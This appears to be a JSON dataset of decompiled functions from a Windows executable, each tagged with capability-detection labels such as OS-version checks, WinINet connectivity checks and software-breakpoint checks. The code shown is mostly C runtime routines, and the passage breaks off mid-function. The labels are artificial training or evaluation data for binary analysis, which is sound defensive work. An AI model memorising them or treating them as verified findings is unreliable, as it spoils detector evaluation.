{
    "004047c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004047c7(uint *param_1)\n\n{\n    *param_1 = 0x401210;\n    if (param_1[2] != 0) {\n        fcn.0040562b(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040458d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040458d(char param_1)\n\n{\n    int32_t unaff_ESI;\n    \n    if ((param_1 != '\\0') && (0xf < *(unaff_ESI + 0x18))) {\n        fcn.004045e2(*(unaff_ESI + 4));\n    }\n    *(unaff_ESI + 0x18) = 0xf;\n    fcn.004045b7();\n    return;\n}\n",
        "token_count": 101
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404dd9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00404ecc: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00404ed1)\n// WARNING: Removing unreachable block (ram,0x00404eff)\n// WARNING: Removing unreachable block (ram,0x00404ed7)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404dd9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f4c(0x40f880, 0x18);\n    fcn.00407dd8(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4280bc != 1) {\n        *0x4280b8 = 1;\n        *0x4280b4 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.004058a7(*0x43ef68);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.004058a7(*0x43ef64);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.0040589e();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.004058a7(*piVar2);\n                        iVar3 = fcn.0040589e();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.004058a7(*0x43ef68);\n                        piVar1 = fcn.004058a7(*0x43ef64);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00404d13(0x4011c8);\n        }\n        fcn.00404d13(0x4011d0);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00407cfe(8);\n    }\n    return;\n}\n",
        "token_count": 801
    },
    "004051f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004051f0(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00407cfe(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00405410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405410(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4110e8) {\n        return;\n    }\n    *0x4288c0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4288c4 = &arg_8h;\n    *0x428800 = 0x10001;\n    *0x4287a8 = 0xc0000409;\n    *0x4287ac = 1;\n    var_328h = *0x4110e8;\n    var_324h = *0x4110ec;\n    *0x4287b4 = unaff_retaddr;\n    *0x42888c = in_GS;\n    *0x428890 = in_FS;\n    *0x428894 = in_ES;\n    *0x428898 = in_DS;\n    *0x42889c = unaff_EDI;\n    *0x4288a0 = unaff_ESI;\n    *0x4288a4 = unaff_EBX;\n    *0x4288a8 = in_EDX;\n    *0x4288ac = in_ECX;\n    *0x4288b0 = in_EAX;\n    *0x4288b4 = unaff_EBP;\n    *0x4288b8 = unaff_retaddr;\n    *0x4288bc = in_CS;\n    *0x4288c8 = in_SS;\n    *0x4287f8 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040a005(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401a5c);\n    if (*0x4287f8 == 0) {\n        fcn.0040a005(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 837
    },
    "0040827b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040827b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040589e();\n    var_4h = 0;\n    if (*0x428794 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401a50);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401a44);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x428794 = fcn.0040582c(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401a34);\n        *0x428798 = fcn.0040582c(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401a20);\n        *0x42879c = fcn.0040582c(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401a04);\n        *0x4287a4 = fcn.0040582c(uVar3);\n        if (*0x4287a4 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4019ec);\n            *0x4287a0 = fcn.0040582c(uVar3);\n        }\n    }\n    if ((*0x4287a0 != iVar1) && (*0x4287a4 != iVar1)) {\n        pcVar4 = fcn.004058a7(*0x4287a0);\n        pcVar5 = fcn.004058a7(*0x4287a4);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x004083bd;\n        }\n    }\n    if ((((*0x428798 != iVar1) && (pcVar4 = fcn.004058a7(*0x428798),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x42879c != iVar1 && (pcVar4 = fcn.004058a7(*0x42879c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x004083bd:\n    pcVar4 = fcn.004058a7(*0x428794);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 828
    },
    "0040bd7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bd7e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110e8 ^ &stack0xfffffffc;\n    fcn.00406602(arg_10h);\n    var_14h = fcn.0040cf01(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c479(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040bdd7:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040be17;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040be09:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040be17;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040be09;\n        goto code_r0x0040bdd7;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040be17:\n    fcn.00405410(unaff_EBX);\n    return;\n}\n",
        "token_count": 503
    },
    "0040be26": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040be26(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110e8 ^ &stack0xfffffffc;\n    fcn.00406602(arg_10h);\n    var_14h = fcn.0040cf01(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040c9bd(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040be7f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040bebf;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040beb1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040bebf;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040beb1;\n        goto code_r0x0040be7f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040bebf:\n    fcn.00405410(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "0040c479": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c479(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040c97a;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040c5ae;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040c5b5;\ncode_r0x0040c5ae:\n                        do {\n                            var_4h = 1;\ncode_r0x0040c5b5:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040c5c3;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040c5c3:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x411d64 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x411d64 < iVar12) {\n                if (iVar12 < *0x411d60) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x411d60;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040c97a;\n            }\n            var_10h = *0x411d64 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040c766;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040c766:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040c97a:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3677
    },
    "0040c9bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c9bd(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040cebe;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x411d80 - 1;\n        iVar4 = *0x411d80 + (*0x411d80 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x411d80 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040caf2;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040caf9;\ncode_r0x0040caf2:\n                        do {\n                            var_4h = 1;\ncode_r0x0040caf9:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040cb07;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040cb07:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x411d7c - *0x411d80) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x411d7c < iVar12) {\n                if (iVar12 < *0x411d78) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x411d8c;\n                    iVar4 = *0x411d84 + (*0x411d84 >> 0x1f & 0x1fU) >> 